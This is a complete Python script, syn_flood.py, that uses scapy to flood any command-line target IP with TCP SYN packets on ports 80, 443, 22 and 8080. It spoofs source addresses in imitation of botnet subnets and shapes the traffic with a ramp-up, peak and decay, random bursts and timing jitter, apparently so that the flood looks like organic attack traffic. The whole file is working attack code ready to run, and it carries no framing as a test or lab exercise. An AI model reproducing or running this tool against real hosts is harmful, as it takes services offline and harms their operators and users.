#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys
import math

def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break

        phase = elapsed / duration

        if phase < 0.2:          # baseline
            intensity = 0.2
        elif phase < 0.5:        # ramp
            intensity = 0.2 + (phase * 1.2)
        elif phase < 0.8:        # peak
            intensity = 1.0
        else:                    # decay
            intensity = 0.4

        yield intensity


def random_clustered_ip():
    # simulate bot clusters (/24 subnet grouping)
    subnet = random.randint(1, 223)
    cluster = random.randint(0, 50)
    return f"{subnet}.{cluster}.{random.randint(0,255)}.{random.randint(1,254)}"


def syn_flood(target_ip, duration):

    base_rate = 50
    peak_rate = 1000
    burst_probability = 0.15

    for intensity in attack_profile(duration):

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        if random.random() < burst_probability:
            burst = random.randint(20, 150)
        else:
            burst = 1

        for _ in range(burst):
            pkt = (
                scapy.IP(src=random_clustered_ip(), dst=target_ip) /
                scapy.TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443, 22, 8080]),
                    flags="S",
                    seq=random.randint(0, 100000)
                )
            )
            scapy.send(pkt, verbose=0)

        sleep_time = max(0.0005, 1.0 / current_rate)
        sleep_time *= random.uniform(0.5, 1.5)  # jitter
        time.sleep(sleep_time)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: syn_flood.py <target_ip> <duration>")
        sys.exit(1)

    syn_flood(sys.argv[1], int(sys.argv[2]))